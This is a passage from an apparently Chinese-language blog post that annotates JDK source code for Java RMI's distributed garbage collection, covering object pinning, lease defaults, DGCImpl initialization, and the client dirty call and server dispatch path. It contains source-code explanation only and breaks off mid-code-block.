<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将目标对象的实现从“弱可达”提升为“强可达”（pin）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;语义/目的：</span></span><br><span class="line"><span class="comment"> * &lt;ul&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;默认情况下，ObjectTable 只持有实现对象的 &lt;b&gt;弱引用&lt;/b&gt;（WeakRef），</span></span><br><span class="line"><span class="comment"> *       以便当没有任何远程/本地强引用时，JVM 可回收该实现对象。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;当需要确保实现对象在一段时间内&lt;b&gt;绝不被本地 GC 回收&lt;/b&gt;（例如刚导出、</span></span><br><span class="line"><span class="comment"> *       正在处理入站调用、或处于“永久导出”策略）时，调用本方法将 WeakRef</span></span><br><span class="line"><span class="comment"> *       转为内部的强引用，从而“固定（pin）”实现对象。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;固定后，对象表中的“存活性”完全由这条 WeakRef/强引用逻辑负责，</span></span><br><span class="line"><span class="comment"> *       与分布式 GC（DGC）/租约机制配合使用可防止过早回收。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ul&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;并发：使用 Target 实例作为锁，避免与其它生命周期操作并发修改</span></span><br><span class="line"><span class="comment"> * weakImpl 的内部状态。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">pinImpl</span><span class="params">()</span> &#123;</span><br><span class="line">    weakImpl.pin();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将内部弱引用“固定”为强引用（若尚未固定）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;实现细节：</span></span><br><span class="line"><span class="comment"> * &lt;ul&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;当 &#123;<span class="doctag">@code</span> strongRef == null&#125; 时，从弱引用 &#123;<span class="doctag">@code</span> get()&#125; 读取目标对象，</span></span><br><span class="line"><span class="comment"> *       并缓存到 &#123;<span class="doctag">@code</span> strongRef&#125;，从而形成一条本地强引用，阻止 GC。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;重复调用是幂等的：已固定时不做任何操作。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;开启 VERBOSE 日志时，会输出固定后的强引用指向对象，便于诊断。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ul&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;注意：</span></span><br><span class="line"><span class="comment"> * &lt;ul&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;固定对象必须与相应的“解固定（unpin）/引用计数减少”配对使用，</span></span><br><span class="line"><span class="comment"> *       否则可能导致服务端实现对象长期不能被回收（内存泄漏）。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;该方法仅影响&lt;b&gt;本地 GC 可达性&lt;/b&gt;；远端持有的引用与 DGC 租约续约</span></span><br><span class="line"><span class="comment"> *       仍然由 DGC 逻辑单独管理。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ul&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">pin</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 尚未固定则建立强引用</span></span><br><span class="line">    <span class="keyword">if</span> (strongRef == <span class="literal">null</span>) &#123;</span><br><span class="line">        strongRef = get(); <span class="comment">// 从弱引用读取目标对象</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (DGCImpl.dgcLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">            DGCImpl.dgcLog.log(Log.VERBOSE, <span class="string">&quot;strongRef = &quot;</span> + strongRef);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们知道，当一个类的静态方法或者静态成员被访问的时候，会触发隐式类加载，类的静态代码块被执行并且类的静态变量被初始化。</p>
<p>首先租约时长 <code>leaseValue</code> 会被初始化为默认值 10 分钟。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * RMI 分布式 GC（DGC）授予客户端的“租约时长”（毫秒）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 来源与默认：</span></span><br><span class="line"><span class="comment"> * - 来自系统属性：&#123;<span class="doctag">@code</span> java.rmi.dgc.leaseValue&#125;（单位：毫秒）</span></span><br><span class="line"><span class="comment"> * - 若未设置该属性，默认值为 &#123;<span class="doctag">@code</span> 600_000&#125;（10 分钟）</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">leaseValue</span> <span class="operator">=</span></span><br><span class="line">    AccessController.doPrivileged(</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">GetLongAction</span>(<span class="string">&quot;java.rmi.dgc.leaseValue&quot;</span>, <span class="number">600000</span>));</span><br></pre></td></tr></table></figure></div>

<p>另外还会执行 <code>DGCImpl</code> 的静态代码代码块：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 在“受控/隔离”的上下文中导出（注册）单例 DGCImpl，</span></span><br><span class="line"><span class="comment">     * 避免受当前线程任意上下文类加载器与权限的影响。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Void&gt;() &#123;</span><br><span class="line">        <span class="keyword">public</span> Void <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="comment">// 1) 以系统类加载器进行初始化，避免被调用方线程的 CCL 干扰</span></span><br><span class="line">            <span class="type">ClassLoader</span> <span class="variable">savedCcl</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.currentThread().setContextClassLoader(ClassLoader.getSystemClassLoader());</span><br><span class="line"></span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 * 2) 手动将 DGC 服务放入对象表，而不是调用 UnicastServerRef.exportObject，</span></span><br><span class="line"><span class="comment">                 *    这样不会立刻触发传输层开始监听（exportObject 会导致 transport 进入监听状态）。</span></span><br><span class="line"><span class="comment">                 *    手工注册后，DGC 的 ServerRef 仍可按需被解析和调用。</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    dgc = <span class="keyword">new</span> <span class="title class_">DGCImpl</span>();                      <span class="comment">// DGC 业务实现（单例）</span></span><br><span class="line">                    <span class="type">ObjID</span> <span class="variable">dgcID</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(ObjID.DGC_ID);    <span class="comment">// 约定的保留 ObjID（专用于 DGC）</span></span><br><span class="line">                    <span class="type">LiveRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LiveRef</span>(dgcID, <span class="number">0</span>);      <span class="comment">// 端口 0：使用传输层默认端点/端口</span></span><br><span class="line">                    <span class="comment">// ServerRef（分发器），附带入站流校验钩子（反序列化前置检查）</span></span><br><span class="line">                    <span class="type">UnicastServerRef</span> <span class="variable">disp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastServerRef</span>(ref, DGCImpl::checkInput);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 生成对外可见的代理（stub）：把远程引用封装为 JRMP 动态代理</span></span><br><span class="line">                    <span class="type">Remote</span> <span class="variable">stub</span> <span class="operator">=</span> Util.createProxy(DGCImpl.class, <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(ref), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 兼容旧协议（1.1 stub）：设置 skeleton，供旧式调用路径使用</span></span><br><span class="line">                    disp.setSkeleton(dgc);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 3) 构造“最小权限”的接受权限集，仅允许 accept/resolve</span></span><br><span class="line">                    <span class="type">Permissions</span> <span class="variable">perms</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Permissions</span>();</span><br><span class="line">                    perms.add(<span class="keyword">new</span> <span class="title class_">SocketPermission</span>(<span class="string">&quot;*&quot;</span>, <span class="string">&quot;accept,resolve&quot;</span>));</span><br><span class="line">                    ProtectionDomain[] pd = &#123; <span class="keyword">new</span> <span class="title class_">ProtectionDomain</span>(<span class="literal">null</span>, perms) &#125;;</span><br><span class="line">                    <span class="type">AccessControlContext</span> <span class="variable">acceptAcc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AccessControlContext</span>(pd);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 4) 在受限 ACC 下创建 Target：</span></span><br><span class="line">                    <span class="comment">//    Target 会捕获该 ACC；后续 serviceCall 分发时将以此 ACC 执行敏感操作。</span></span><br><span class="line">                    <span class="type">Target</span> <span class="variable">target</span> <span class="operator">=</span> AccessController.doPrivileged(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Target&gt;() &#123;</span><br><span class="line">                            <span class="keyword">public</span> Target <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                                <span class="comment">// permanent=true：DGC 作为“永久对象”，不参与一般的本地/分布式 GC 摘除</span></span><br><span class="line">                                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Target</span>(dgc, disp, stub, dgcID, <span class="literal">true</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;,</span><br><span class="line">                        acceptAcc <span class="comment">// 用受限权限创建并绑定 Target 的执行上下文</span></span><br><span class="line">                    );</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 5) 注册到全局对象表：建立 ObjID → Target 映射，供入站调用按 ID 定位</span></span><br><span class="line">                    ObjectTable.putTarget(target);</span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">                    <span class="comment">// 初始化服务器侧 DGC 失败即为致命错误</span></span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;exception initializing server-side DGC&quot;</span>, e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="comment">// 6) 恢复调用方原始 CCL，避免影响外部代码的类加载行为</span></span><br><span class="line">                Thread.currentThread().setContextClassLoader(savedCcl);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这部分的主要逻辑为：</p>
<ol>
<li><p><code>DGCImpl</code> 的设计是单例模式，因此首先会在静态代码快中创建唯一的 <code>DGCImpl</code> 实例：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dgc = <span class="keyword">new</span> <span class="title class_">DGCImpl</span>();  <span class="comment">// 创建 DGCImpl 的实例</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>创建用于远程通信的 <code>LiveRef</code>，并封装为 <code>UnicastServerRef</code>。其中 <code>ObjId</code> 为 2，监听端口随机。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjID</span> <span class="variable">dgcID</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(ObjID.DGC_ID);  <span class="comment">// 创建 DGC 的 ObjID</span></span><br><span class="line"><span class="type">LiveRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LiveRef</span>(dgcID, <span class="number">0</span>);  <span class="comment">// 创建 LiveRef 引用</span></span><br><span class="line"><span class="type">UnicastServerRef</span> <span class="variable">disp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastServerRef</span>(ref, DGCImpl::checkInput);  <span class="comment">// 创建 UnicastServerRef</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>和注册中心一样，<code>UnicastServerRef#setSkeleton</code> 会调用 <code>Util.createSkeleton</code> 创建注册中心 <code>DGCImpl_Skel</code> 的骨架类</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disp.setSkeleton(dgc);  <span class="comment">// 设置 Skeleton</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>创建 <code>DGCImpl</code> 的存根对象  <code>DGCImpl_Stub</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建 DGCImpl 的远程代理 (Stub)</span></span><br><span class="line"><span class="type">Remote</span> <span class="variable">stub</span> <span class="operator">=</span> Util.createProxy(DGCImpl.class, <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(ref), <span class="literal">true</span>);</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>创建 <code>Target</code> 对象并存放至 <code>ObjectTable</code> 中。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用 PrivilegedAction 创建 Target 对象</span></span><br><span class="line"><span class="type">Target</span> <span class="variable">target</span> <span class="operator">=</span> AccessController.doPrivileged(</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Target&gt;() &#123;</span><br><span class="line">        <span class="keyword">public</span> Target <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Target</span>(dgc, disp, stub, dgcID, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, acceptAcc);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将 target 放入 ObjectTable 中</span></span><br><span class="line">ObjectTable.putTarget(target);</span><br></pre></td></tr></table></figure></div></li>
</ol>
<h4 id="客户端部分-1"><a href="#客户端部分-1" class="headerlink" title="客户端部分"></a>客户端部分</h4><p>当注册中心返回一个 <code>Stub</code> 给客户端时，其跟踪 <code>Stub</code> 在客户端中的使用。当再没有更多的对 <code>Stub</code> 的引用时，或者如果引用的“租借”过期（租期默认 10 分钟）并且没有更新，服务端将垃圾回收远程对象。客户端可以调用 <code>dirty</code> 用来续租，也可以调用 <code>clean</code> 用来清除远程对象。</p>
<p>类似注册中心，客户端本地也会生成一个 <code>DGCImpl_Stub</code>，并调用 <code>DGCImpl_Stub#dirty</code>，用来向服务端”租赁”远程对象的引用。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 客户端存根：向远端 DGC 服务发送 &#123;<span class="doctag">@code</span> dirty&#125; 请求以“声明/续约”当前 JVM</span></span><br><span class="line"><span class="comment"> * 持有的远程对象引用，并返回服务器授予的 &#123;<span class="doctag">@link</span> java.rmi.dgc.Lease&#125;。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;实现要点：</span></span><br><span class="line"><span class="comment"> * 1) 通过 &#123;<span class="doctag">@code</span> ref.newCall(...)&#125; 创建一次 JRMP 调用；</span></span><br><span class="line"><span class="comment"> * 2) 将 &#123;<span class="doctag">@code</span> ObjID[]&#125;、序列号（&#123;<span class="doctag">@code</span> long&#125;）以及当前 &#123;<span class="doctag">@code</span> Lease&#125; 编组成请求参数；</span></span><br><span class="line"><span class="comment"> * 3) 发送请求，随后对返回值设置【输入过滤器】（JEP 290 风格）后再反序列化；</span></span><br><span class="line"><span class="comment"> * 4) 按异常类型决定连接是否可复用；完成调用收尾。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;安全性：在反序列化返回值（Lease）之前对 &#123;<span class="doctag">@link</span> ObjectInputStream&#125;</span></span><br><span class="line"><span class="comment"> * 设置 &#123;<span class="doctag">@code</span> leaseFilter&#125; 白名单，降低反序列化风险（通过</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@code</span> AccessController.doPrivileged&#125; 执行以兼容可能存在的安全管理器策略）。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> java.rmi.dgc.Lease <span class="title function_">dirty</span><span class="params">(java.rmi.server.ObjID[] $param_arrayOf_ObjID_1,</span></span><br><span class="line"><span class="params">                                <span class="type">long</span> $param_long_2,</span></span><br><span class="line"><span class="params">                                java.rmi.dgc.Lease $param_Lease_3)</span></span><br><span class="line">        <span class="keyword">throws</span> java.rmi.RemoteException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 1) 构造远程调用（op=1 对应 DGC.dirty）</span></span><br><span class="line">        java.rmi.server.<span class="type">RemoteCall</span> <span class="variable">call</span> <span class="operator">=</span></span><br><span class="line">            ref.newCall((java.rmi.server.RemoteObject) <span class="built_in">this</span>, operations, <span class="number">1</span>, interfaceHash);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2) 编组参数：ObjID[]、sequence、Lease</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            java.io.<span class="type">ObjectOutput</span> <span class="variable">out</span> <span class="operator">=</span> call.getOutputStream();</span><br><span class="line">            out.writeObject($param_arrayOf_ObjID_1);  <span class="comment">// 远程对象标识集合</span></span><br><span class="line">            out.writeLong($param_long_2);             <span class="comment">// 递增序列号（去重/乱序控制）</span></span><br><span class="line">            out.writeObject($param_Lease_3);          <span class="comment">// 客户端携带的租约（含 VMID）</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">            <span class="comment">// 参数编组失败 → 按 RMI 规范抛 MarshalException</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.rmi.MarshalException(<span class="string">&quot;error marshalling arguments&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3) 发送请求</span></span><br><span class="line">        ref.invoke(call);</span><br><span class="line"></span><br><span class="line">        java.rmi.dgc.Lease $result;</span><br><span class="line">        <span class="comment">// 记录底层连接引用，出错时决定是否复用</span></span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> ((StreamRemoteCall) call).getConnection();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 4) 反序列化返回值（Lease）</span></span><br><span class="line">            java.io.<span class="type">ObjectInput</span> <span class="variable">in</span> <span class="operator">=</span> call.getInputStream();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 若是 OIS，则先安装对象输入过滤器，仅允许 DGC 相关类型</span></span><br><span class="line">            <span class="keyword">if</span> (in <span class="keyword">instanceof</span> ObjectInputStream) &#123;</span><br><span class="line">                <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> (ObjectInputStream) in;</span><br><span class="line">                AccessController.doPrivileged((PrivilegedAction&lt;Void&gt;) () -&gt; &#123;</span><br><span class="line">                    ois.setObjectInputFilter(DGCImpl_Stub::leaseFilter);</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $result = (java.rmi.dgc.Lease) in.readObject();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (java.io.IOException | java.lang.ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="comment">// 返回值解组失败：出于保守考虑，不再复用该连接</span></span><br><span class="line">            <span class="keyword">if</span> (connection <span class="keyword">instanceof</span> TCPConnection) &#123;</span><br><span class="line">                ((TCPConnection) connection).getChannel().free(connection, <span class="comment">/*reuse*/</span> <span class="literal">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 并按 RMI 规范抛 UnmarshalException</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.rmi.UnmarshalException(<span class="string">&quot;error unmarshalling return&quot;</span>, e);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">// 5) 调用收尾（释放流/内部资源；按 StreamRemoteCall 语义通常不再抛 IO）</span></span><br><span class="line">            ref.done(call);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (java.lang.RuntimeException e) &#123;</span><br><span class="line">        <span class="comment">// 本地侧运行时异常：原样抛出（连接释放由 finally/上面分支负责）</span></span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (java.rmi.RemoteException e) &#123;</span><br><span class="line">        <span class="comment">// 远程异常：原样抛出（含通信/服务端 RemoteException 等）</span></span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (java.lang.Exception e) &#123;</span><br><span class="line">        <span class="comment">// 未在方法签名中声明的受检异常 → 包装为 UnexpectedException</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.rmi.UnexpectedException(<span class="string">&quot;undeclared checked exception&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>前面在服务调用分析过：</p>
<ul>
<li><code>ref.invoke(call)</code> 会有调用链 <code>invoke =&gt; UnicastRef#invoke =&gt; executeCall() =&gt; readObject()</code>，其中 <code>executeCall</code> 会在远程调用异常的时候将异常对象反序列化。</li>
<li>如果正常调用，<code>dirty</code> 后续会对返回的对象反序列化。</li>
</ul>
<h4 id="服务端部分-1"><a href="#服务端部分-1" class="headerlink" title="服务端部分"></a>服务端部分</h4><p>因为也是远程调用，因此服务端同样会通过 <code>sun.rmi.transport.tcp.TCPTransport#handleMessages</code> 函数处理请求。然后又因为 <code>DGCImpl</code> 对应的 <code>Target</code> 与注册中心类似，因此有调用链 <code>handleMessages =&gt; UnicastServerRef#dispatch =&gt; oldDispatch</code>。</p>
<p><code>oldDispatch</code> 会调用 <code>DGCImpl_Skel#dispatch</code>：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span 